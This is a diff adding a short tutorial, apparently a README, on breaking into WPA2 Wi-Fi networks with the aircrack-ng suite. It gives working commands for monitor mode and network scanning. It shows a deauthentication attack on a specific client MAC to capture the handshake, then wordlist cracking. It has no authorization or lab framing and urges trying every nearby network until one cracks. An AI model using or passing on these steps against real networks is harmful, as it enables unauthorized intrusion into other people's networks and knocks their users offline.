@@ -1,0 +1,68 @@
+First you would need the "aircrack-ng" package.
+
+
+First we find out what your wireless card is named with the commmand
+> ifconfig (it usually starts with wl)
+
+then run this command to turn on monitor mode if your wirless card has that capability
+> airmon-ng start wlp1s0 (in sudo)
+
+then run this command to check if its in monitor mode:
+> iwconfig
+
+wlp1s0    IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm   
+          Retry short limit:7   RTS thr:off   Fragment thr:off
+          Power Management:on
+
+if it isnt in monitor mode this probably means your wireless card does not support monitor mode.
+
+and sometimes the airmon-ng command changes the network card's name
+
+
+After that we run this command to check for the wireless networks that we can listen to
+
+> airodump-ng wlp1s0
+
+
+their we want to save the BSSID and the channel (CH)
+
+ 44:E9:68:42:8D:28  -86        6        0    0   4  130   WPA2 CCMP   PSK  Wifi_Perso_2.4G                         
+
+With this information we can use the next command to let us see who is connected to that particular Wifi network
+
+> airodump-ng -d 44:E9:68:42:8D:28 -w file_name -c 4 wlp1s0
+
+
+
+Now we want to deauthenticate those users so we can capture the 3 way handshake when they reconnect
+
+> aireplay-ng -0 10 -a 44:E9:68:42:8D:28 -c CA:38:21:BD:44:44 wlp1s0
+
+this is called a deauthentication attack
+
+we are sending 10 deauthentication packets to selected target
+
+After the target is deauthenticated, it will try to reconnect and thats when we will capture the Handshake , it will show on the top right of airodimp-ng, if it hasnt been captured you can repeat the command to deauthenticate or switch targets
+
+
+After the Handshake is captured, we will see that a couple of files have been saved with the handshake, and now we need to crack them using worlists.
+
+> aircrack-ng -w WORLDLIST_HERE FILE_WITH_THE_HANSHAKE_HER
+
+
+and then just wait and hope that a key will be found.
+
+If no key is found, try the same method with all the networks close to you until you find a hit
+
+
+After finishing your work, use this command to restart your wirless network card and get it back to normal function
+
+> airmon-ng stop wlp1s0
+> systemctl restart net*
+
+Enjoy 
+
+
+
+
+
